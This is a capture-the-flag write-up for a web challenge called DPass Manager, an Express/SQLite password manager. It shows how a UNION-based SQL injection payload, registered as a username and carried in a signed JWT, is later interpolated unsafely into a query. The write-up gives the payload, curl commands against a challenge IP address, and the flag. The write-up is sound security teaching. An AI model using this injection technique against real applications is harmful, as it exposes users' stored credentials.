# DPass Manager — Web Challenge Writeup

**Challenge:** DPass Manager  
**Category:** Web  
**Event:** ADF 2026 Hackathon  
**Flag:** `HTB{s3c0nd_0rd3r_1nj3c7ibl3_f4447645e73ef29d44b80f8cce295ff3}`

---

## Overview

DPass Manager is a password management web application built with Express.js, Nunjucks templating, SQLite (`sqlite-async`), and JWT authentication (`jsonwebtoken ^8.5.1`). The flag is stored as the admin user's password in the `saved_passwords` table.

---

## How We Solved It — Reasoning

### Initial Reconnaissance

Examining the provided source code revealed several potential attack vectors:

1. **JWT `jsonwebtoken ^8.5.1`** — classically vulnerable to `alg:none` bypass. However, testing showed that jsonwebtoken 8.5.1's `verify()` function blocks `alg:none` when a secret is provided: `"jwt signature is required"`.

2. **Nunjucks `autoescape: true`** — XSS was a dead end from the start. The template engine is correctly configured.

3. **SQL Injection** — `getSavedPasswords()` in `database.js` line 97 uses string interpolation:
   ```javascript
   let query = this.db.all(`SELECT * FROM saved_passwords WHERE owner = '${username}'`);
   ```
   The `username` parameter comes from `req.data.username`, which is the JWT-decoded username.

### The Key Insight: Second-Order SQL Injection

The critical realization was that the SQLi doesn't require JWT forgery at all. The attack chain works through **legitimate application flow**:

1. **Register** a user with a SQL injection payload as the `username` — the `registerUser()` function uses parameterized queries (`?` placeholders), so the malicious username is stored safely in the database.

2. **Login** as that user — the server signs a legitimate JWT containing the malicious username in the payload.

3. **Access `/api/passwords`** — the JWT is verified, `req.data.username` contains our SQLi payload, and `getSavedPasswords()` interpolates it directly into the SQL query without parameterization.

This is a **second-order SQL injection**: the injection payload is stored correctly (parameterized INSERT), but exploited later when retrieved and used unsafely (string interpolation in SELECT).

### Eliminated Hypotheses

- **JWT `alg:none`**: Blocked by `jsonwebtoken 8.5.1` "jwt signature is required" check when a secret is provided.
- **JWT key confusion (RS256→HS256)**: No public key exposed; only symmetric HS256 used.
- **JWT secret brute force**: `crypto.randomBytes(69).toString('hex')` — 138 hex characters, effectively unbreakable.
- **Other SQLi entry points**: All other database functions use parameterized queries correctly.

### Exploitation

**Payload username:**
```
' UNION SELECT id,owner,type,address,username,password,note FROM saved_passwords WHERE owner='admin
```

When the JWT's username field is interpolated into the query, it becomes:
```sql
SELECT * FROM saved_passwords WHERE owner = '' UNION SELECT id,owner,type,address,username,password,note FROM saved_passwords WHERE owner='admin'
```

This UNION injection:
1. Returns zero rows from the first SELECT (no user has an empty-string owner)
2. Appends the admin's saved passwords via UNION
3. The admin's `password` field contains the flag

**Exploit commands:**
```bash
# Register with SQLi username
curl -s -X POST http://154.57.164.83:30659/api/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"'"'"' UNION SELECT id,owner,type,address,username,password,note FROM saved_passwords WHERE owner='"'"'admin","password":"sqli123","email":"sqli@test.com"}'

# Login to get JWT
curl -s -D- -X POST http://154.57.164.83:30659/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"'"'"' UNION SELECT id,owner,type,address,username,password,note FROM saved_passwords WHERE owner='"'"'admin","password":"sqli123"}'

# Access passwords (extract JWT from Set-Cookie header above)
curl -s http://154.57.164.83:30659/api/passwords \
  -b 'session=<JWT_TOKEN>'
```

---

## Vulnerability Summary

| Component | Issue |
|-----------|-------|
| `database.js:getSavedPasswords()` | SQL injection via `${username}` string interpolation |
| `database.js:registerUser()` | Correctly parameterized — enables second-order injection |
| `helpers/JWTHelper.js` | JWT `alg:none` blocked; singular `algorithm` option ignored but safe by default |
| `routes/index.js` | JWT username trusted without sanitization for SQL context |

**Root cause:** Mixing parameterized queries (safe) with string interpolation (unsafe) in the same codebase. The `username` field is treated as trusted data because it came from a verified JWT, but the JWT payload is ultimately derived from user-controlled registration input.

---

## Flag

```
HTB{s3c0nd_0rd3r_1nj3c7ibl3_f4447645e73ef29d44b80f8cce295ff3}
```
